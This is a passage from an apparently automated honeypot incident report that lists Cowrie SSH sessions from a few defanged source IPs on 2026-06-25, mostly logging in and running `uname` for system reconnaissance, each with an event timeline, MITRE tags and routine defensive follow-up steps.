| `2026-06-25 08:33:22` | `cowrie.command.input` |
| `2026-06-25 08:33:22` | `cowrie.log.closed` |
| `2026-06-25 08:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5333016f6234

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:34 |
| **Last Seen** | 2026-06-25 08:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:34:06` | `cowrie.session.connect` |
| `2026-06-25 08:34:06` | `cowrie.client.version` |
| `2026-06-25 08:34:06` | `cowrie.client.kex` |
| `2026-06-25 08:34:06` | `cowrie.login.success` |
| `2026-06-25 08:34:07` | `cowrie.session.params` |
| `2026-06-25 08:34:07` | `cowrie.command.input` |
| `2026-06-25 08:34:07` | `cowrie.log.closed` |
| `2026-06-25 08:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c513cb9b66c

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:34 |
| **Last Seen** | 2026-06-25 08:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:34:51` | `cowrie.session.connect` |
| `2026-06-25 08:34:51` | `cowrie.client.version` |
| `2026-06-25 08:34:51` | `cowrie.client.kex` |
| `2026-06-25 08:34:52` | `cowrie.login.success` |
| `2026-06-25 08:34:53` | `cowrie.session.params` |
| `2026-06-25 08:34:53` | `cowrie.command.input` |
| `2026-06-25 08:34:53` | `cowrie.log.closed` |
| `2026-06-25 08:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba07c3cdc2e3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:34 |
| **Last Seen** | 2026-06-25 08:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:34:51` | `cowrie.session.connect` |
| `2026-06-25 08:34:51` | `cowrie.client.version` |
| `2026-06-25 08:34:51` | `cowrie.client.kex` |
| `2026-06-25 08:34:51` | `cowrie.login.success` |
| `2026-06-25 08:34:52` | `cowrie.session.params` |
| `2026-06-25 08:34:52` | `cowrie.command.input` |
| `2026-06-25 08:34:52` | `cowrie.log.closed` |
| `2026-06-25 08:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-305807225bdb

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:34 |
| **Last Seen** | 2026-06-25 08:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:34:52` | `cowrie.session.connect` |
| `2026-06-25 08:34:52` | `cowrie.client.version` |
| `2026-06-25 08:34:52` | `cowrie.client.kex` |
| `2026-06-25 08:34:53` | `cowrie.login.success` |
| `2026-06-25 08:34:54` | `cowrie.session.params` |
| `2026-06-25 08:34:54` | `cowrie.command.input` |
| `2026-06-25 08:34:54` | `cowrie.log.closed` |
| `2026-06-25 08:34:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b002529d6df0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:35 |
| **Last Seen** | 2026-06-25 08:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:35:37` | `cowrie.session.connect` |
| `2026-06-25 08:35:37` | `cowrie.client.version` |
| `2026-06-25 08:35:37` | `cowrie.client.kex` |
| `2026-06-25 08:35:37` | `cowrie.login.success` |
| `2026-06-25 08:35:38` | `cowrie.session.params` |
| `2026-06-25 08:35:38` | `cowrie.command.input` |
| `2026-06-25 08:35:38` | `cowrie.log.closed` |
| `2026-06-25 08:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-528bac78fa96

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:36 |
| **Last Seen** | 2026-06-25 08:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:36:02` | `cowrie.session.connect` |
| `2026-06-25 08:36:02` | `cowrie.client.version` |
| `2026-06-25 08:36:02` | `cowrie.client.kex` |
| `2026-06-25 08:36:03` | `cowrie.login.success` |
| `2026-06-25 08:36:03` | `cowrie.session.params` |
| `2026-06-25 08:36:03` | `cowrie.command.input` |
| `2026-06-25 08:36:04` | `cowrie.log.closed` |
| `2026-06-25 08:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-669c171824c6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:36 |
| **Last Seen** | 2026-06-25 08:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:36:24` | `cowrie.session.connect` |
| `2026-06-25 08:36:24` | `cowrie.client.version` |
| `2026-06-25 08:36:24` | `cowrie.client.kex` |
| `2026-06-25 08:36:24` | `cowrie.login.success` |
| `2026-06-25 08:36:25` | `cowrie.session.params` |
| `2026-06-25 08:36:25` | `cowrie.command.input` |
| `2026-06-25 08:36:25` | `cowrie.log.closed` |
| `2026-06-25 08:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-778449940448

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 08:36 |
| **Last Seen** | 2026-06-25 08:36 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:36:37` | `cowrie.session.connect` |
| `2026-06-25 08:36:38` | `cowrie.client.version` |
| `2026-06-25 08:36:38` | `cowrie.client.kex` |
| `2026-06-25 08:36:45` | `cowrie.login.success` |
| `2026-06-25 08:36:49` | `cowrie.session.params` |
| `2026-06-25 08:36:49` | `cowrie.command.input` |
| `2026-06-25 08:36:51` | `cowrie.log.closed` |
| `2026-06-25 08:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f873b7722595

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:37 |
| **Last Seen** | 2026-06-25 08:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:37:10` | `cowrie.session.connect` |
| `2026-06-25 08:37:10` | `cowrie.client.version` |
| `2026-06-25 08:37:10` | `cowrie.client.kex` |
| `2026-06-25 08:37:10` | `cowrie.login.success` |
| `2026-06-25 08:37:11` | `cowrie.session.params` |
| `2026-06-25 08:37:11` | `cowrie.command.input` |
| `2026-06-25 08:37:11` | `cowrie.log.closed` |
| `2026-06-25 08:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44bf0b5b2c60

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:37 |
| **Last Seen** | 2026-06-25 08:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:37:41` | `cowrie.session.connect` |
| `2026-06-25 08:37:41` | `cowrie.client.version` |
| `2026-06-25 08:37:42` | `cowrie.client.kex` |
| `2026-06-25 08:37:42` | `cowrie.login.success` |
| `2026-06-25 08:37:43` | `cowrie.session.params` |
| `2026-06-25 08:37:43` | `cowrie.command.input` |
| `2026-06-25 08:37:43` | `cowrie.log.closed` |
| `2026-06-25 08:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d100b3f9951d

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:37 |
| **Last Seen** | 2026-06-25 08:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:37:44` | `cowrie.session.connect` |
| `2026-06-25 08:37:44` | `cowrie.client.version` |
| `2026-06-25 08:37:44` | `cowrie.client.kex` |
| `2026-06-25 08:37:45` | `cowrie.login.success` |
| `2026-06-25 08:37:46` | `cowrie.session.params` |
| `2026-06-25 08:37:46` | `cowrie.command.input` |
| `2026-06-25 08:37:46` | `cowrie.log.closed` |
| `2026-06-25 08:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-236ac1668500

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:37 |
| **Last Seen** | 2026-06-25 08:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:37:56` | `cowrie.session.connect` |
| `2026-06-25 08:37:56` | `cowrie.client.version` |
| `2026-06-25 08:37:56` | `cowrie.client.kex` |
| `2026-06-25 08:37:56` | `cowrie.login.success` |
| `2026-06-25 08:37:57` | `cowrie.session.params` |
| `2026-06-25 08:37:57` | `cowrie.command.input` |
| `2026-06-25 08:37:57` | `cowrie.log.closed` |
| `2026-06-25 08:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f1bcf84022a

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:37 |
| **Last Seen** | 2026-06-25 08:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:37:58` | `cowrie.session.connect` |
| `2026-06-25 08:37:58` | `cowrie.client.version` |
| `2026-06-25 08:37:58` | `cowrie.client.kex` |
| `2026-06-25 08:37:58` | `cowrie.login.success` |
| `2026-06-25 08:37:59` | `cowrie.session.params` |
| `2026-06-25 08:37:59` | `cowrie.command.input` |
| `2026-06-25 08:38:00` | `cowrie.log.closed` |
| `2026-06-25 08:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a6a4a9a37f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:38 |
| **Last Seen** | 2026-06-25 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:38:41` | `cowrie.session.connect` |
| `2026-06-25 08:38:41` | `cowrie.client.version` |
| `2026-06-25 08:38:41` | `cowrie.client.kex` |
| `2026-06-25 08:38:41` | `cowrie.login.success` |
| `2026-06-25 08:38:42` | `cowrie.session.params` |
| `2026-06-25 08:38:42` | `cowrie.command.input` |
| `2026-06-25 08:38:42` | `cowrie.log.closed` |
| `2026-06-25 08:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07cc2aff9a72

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:39 |
| **Last Seen** | 2026-06-25 08:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:39:26` | `cowrie.session.connect` |
| `2026-06-25 08:39:26` | `cowrie.client.version` |
| `2026-06-25 08:39:26` | `cowrie.client.kex` |
| `2026-06-25 08:39:26` | `cowrie.login.success` |
| `2026-06-25 08:39:27` | `cowrie.session.params` |
| `2026-06-25 08:39:27` | `cowrie.command.input` |
| `2026-06-25 08:39:27` | `cowrie.log.closed` |
| `2026-06-25 08:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a4697e14d47

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:40 |
| **Last Seen** | 2026-06-25 08:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:40:02` | `cowrie.session.connect` |
| `2026-06-25 08:40:02` | `cowrie.client.version` |
| `2026-06-25 08:40:03` | `cowrie.client.kex` |
| `2026-06-25 08:40:03` | `cowrie.login.success` |
| `2026-06-25 08:40:04` | `cowrie.session.params` |
| `2026-06-25 08:40:04` | `cowrie.command.input` |
| `2026-06-25 08:40:05` | `cowrie.log.closed` |
| `2026-06-25 08:40:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddd4f989f110

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:40 |
| **Last Seen** | 2026-06-25 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:40:11` | `cowrie.session.connect` |
| `2026-06-25 08:40:11` | `cowrie.client.version` |
| `2026-06-25 08:40:11` | `cowrie.client.kex` |
| `2026-06-25 08:40:11` | `cowrie.login.success` |
| `2026-06-25 08:40:12` | `cowrie.session.params` |
| `2026-06-25 08:40:12` | `cowrie.command.input` |
| `2026-06-25 08:40:12` | `cowrie.log.closed` |
| `2026-06-25 08:40:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e040382fb84d

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:40 |
| **Last Seen** | 2026-06-25 08:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:40:18` | `cowrie.session.connect` |
| `2026-06-25 08:40:18` | `cowrie.client.version` |
| `2026-06-25 08:40:18` | `cowrie.client.kex` |
| `2026-06-25 08:40:19` | `cowrie.login.success` |
| `2026-06-25 08:40:20` | `cowrie.session.params` |
| `2026-06-25 08:40:20` | `cowrie.command.input` |
| `2026-06-25 08:40:20` | `cowrie.log.closed` |
| `2026-06-25 08:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fcad6e32222

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:40 |
| **Last Seen** | 2026-06-25 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:40:57` | `cowrie.session.connect` |
| `2026-06-25 08:40:57` | `cowrie.client.version` |
| `2026-06-25 08:40:57` | `cowrie.client.kex` |
| `2026-06-25 08:40:57` | `cowrie.login.success` |
| `2026-06-25 08:40:58` | `cowrie.session.params` |
| `2026-06-25 08:40:58` | `cowrie.command.input` |
| `2026-06-25 08:40:58` | `cowrie.log.closed` |
| `2026-06-25 08:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77d364400892

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:41 |
| **Last Seen** | 2026-06-25 08:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:41:03` | `cowrie.session.connect` |
| `2026-06-25 08:41:03` | `cowrie.client.version` |
| `2026-06-25 08:41:03` | `cowrie.client.kex` |
| `2026-06-25 08:41:03` | `cowrie.login.success` |
| `2026-06-25 08:41:04` | `cowrie.session.params` |
| `2026-06-25 08:41:04` | `cowrie.command.input` |
| `2026-06-25 08:41:05` | `cowrie.log.closed` |
| `2026-06-25 08:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc63f5bebc6a

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:41 |
| **Last Seen** | 2026-06-25 08:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:41:03` | `cowrie.session.connect` |
| `2026-06-25 08:41:03` | `cowrie.client.version` |
| `2026-06-25 08:41:03` | `cowrie.client.kex` |
| `2026-06-25 08:41:04` | `cowrie.login.success` |
| `2026-06-25 08:41:05` | `cowrie.session.params` |
| `2026-06-25 08:41:05` | `cowrie.command.input` |
| `2026-06-25 08:41:05` | `cowrie.log.closed` |
| `2026-06-25 08:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f20ab9ba99ec

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:41 |
| **Last Seen** | 2026-06-25 08:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:41:14` | `cowrie.session.connect` |
| `2026-06-25 08:41:14` | `cowrie.client.version` |
| `2026-06-25 08:41:14` | `cowrie.client.kex` |
| `2026-06-25 08:41:15` | `cowrie.login.success` |
| `2026-06-25 08:41:16` | `cowrie.session.params` |
| `2026-06-25 08:41:16` | `cowrie.command.input` |
| `2026-06-25 08:41:16` | `cowrie.log.closed` |
| `2026-06-25 08:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-051f4cf37e18

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:41 |
| **Last Seen** | 2026-06-25 08:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:41:43` | `cowrie.session.connect` |
| `2026-06-25 08:41:43` | `cowrie.client.version` |
| `2026-06-25 08:41:43` | `cowrie.client.kex` |
| `2026-06-25 08:41:44` | `cowrie.login.success` |
| `2026-06-25 08:41:44` | `cowrie.session.params` |
| `2026-06-25 08:41:44` | `cowrie.command.input` |
| `2026-06-25 08:41:45` | `cowrie.log.closed` |
| `2026-06-25 08:41:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6ef6f986753

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:42 |
| **Last Seen** | 2026-06-25 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:42:31` | `cowrie.session.connect` |
| `2026-06-25 08:42:31` | `cowrie.client.version` |
| `2026-06-25 08:42:31` | `cowrie.client.kex` |
| `2026-06-25 08:42:32` | `cowrie.login.success` |
| `2026-06-25 08:42:33` | `cowrie.session.params` |
| `2026-06-25 08:42:33` | `cowrie.command.input` |
| `2026-06-25 08:42:33` | `cowrie.log.closed` |
| `2026-06-25 08:42:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a222cc0bdf4a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:43 |
| **Last Seen** | 2026-06-25 08:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:43:19` | `cowrie.session.connect` |
| `2026-06-25 08:43:19` | `cowrie.client.version` |
| `2026-06-25 08:43:19` | `cowrie.client.kex` |
| `2026-06-25 08:43:19` | `cowrie.login.success` |
| `2026-06-25 08:43:20` | `cowrie.session.params` |
| `2026-06-25 08:43:20` | `cowrie.command.input` |
| `2026-06-25 08:43:20` | `cowrie.log.closed` |
| `2026-06-25 08:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9af2f11c7588

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:44 |
| **Last Seen** | 2026-06-25 08:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |
